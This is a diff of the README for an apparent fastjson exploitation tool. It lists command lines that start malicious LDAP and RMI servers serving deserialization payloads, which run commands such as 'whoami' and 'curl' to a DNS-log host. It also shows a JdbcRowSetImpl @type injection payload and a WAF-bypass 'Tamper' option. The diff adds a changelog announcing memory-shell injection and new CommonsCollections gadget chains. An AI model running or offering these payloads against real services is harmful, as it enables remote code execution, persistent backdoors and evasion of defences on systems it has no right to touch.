@@ -8,12 +8,19 @@ java -cp fastjson_tool.jar fastjson.HLDAPServer 127.0.0.1 80 "curl dnslog.wyzxxz
 
 java -cp fastjson_tool.jar fastjson.HLDAPServer2 127.0.0.1 80 "whoami"
 
-java -cp fastjson_tool.jar fastjson.LDAPRefServerAuto 127.0.0.1 1099 file=filename  tamper=tohex
+java -cp fastjson_tool.jar fastjson.LDAPRefServerAuto 127.0.0.1 1099 file=filename  tamper=tohex  chunk=on
 java -cp fastjson_tool.jar fastjson.LDAPRefServer2 1099  CommonsCollections1 "curl dnslog.cn"
 
 java -cp fastjson_tool.jar fastjson.BCELEncode "curl dnslog.wyzxxz.cn"
 java -cp fastjson_tool.jar fastjson.EvilRMIServer 8888 1099 "curl dnslog.wyzxxz.cn" el-win/el-linux/groovy
 java -cp fastjson_tool.jar fastjson.Tamper  "{\"abc\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1099/Object\",\"autoCommit\":true}}" 
+
+
+2021-09-23日志：
+1. fastjson.LDAPRefServerAuto 新增内存shell , chunk编码
+2. fastjson.EvilRMIServer     错误修复
+3. 新增一些反序列利用链
+
 
 2021-03-31 新增：
 1.fastjson.Tamper : fastjson的一些特性，可以绕一些WAF
@@ -128,7 +135,11 @@ CommonsCollections6
 CommonsCollections7
 CommonsCollections8
 CommonsCollections9
-CommonsCollections10
+CommonsCollections10                                                                                                                                                          
+CommonsCollectionsK1                                                                                                                                                             
+CommonsCollectionsK2                                                                                                                                                             
+CommonsCollectionsK3                                                                                                                                                             
+CommonsCollectionsK4
 Groovy1            
 URLDNS             
 JSON1              
